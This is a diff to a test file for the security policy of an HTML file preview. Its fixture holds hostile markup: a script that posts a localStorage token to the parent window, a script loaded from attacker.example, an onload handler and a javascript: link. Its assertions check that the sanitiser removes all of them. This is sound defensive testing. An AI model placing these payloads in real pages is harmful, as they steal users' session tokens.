@@ -9,7 +9,8 @@ describe('HTML file preview security policy', () => {
         '<html><head>',
         '<script>window.parent.postMessage({secret:localStorage.token},"*")</script>',
         '<script src="https://attacker.example/steal.js"></script>',
-        '</head><body><img src="https://images.example/public.png"></body></html>',
+        '</head><body onload="steal()"><a href="javascript:steal()">Open</a>',
+        '<img src="https://images.example/public.png"></body></html>',
       ].join(''),
       {
         schemaVersion: 1,
@@ -38,9 +39,13 @@ describe('HTML file preview security policy', () => {
     expect(rendered).not.toContain('media-src data: blob: http: https:');
     expect(rendered).toContain("worker-src 'none'");
     expect(rendered).toContain("frame-src 'none'");
-    // The original scripts may remain in srcDoc, but CSP grants neither a nonce
-    // nor an external source to them, so only the injected bridge can execute.
-    expect(rendered).toContain('<script src="https://attacker.example/steal.js"></script>');
+    // File Preview is inert: executable markup is removed before the one
+    // nonce-bearing platform bridge is injected into the dedicated response
+    // sandbox.
+    expect(rendered).not.toContain('localStorage.token');
+    expect(rendered).not.toContain('attacker.example/steal.js');
+    expect(rendered).not.toContain('onload=');
+    expect(rendered).not.toContain('javascript:steal()');
     expect(rendered).toContain('<img src="https://images.example/public.png">');
   });
 });
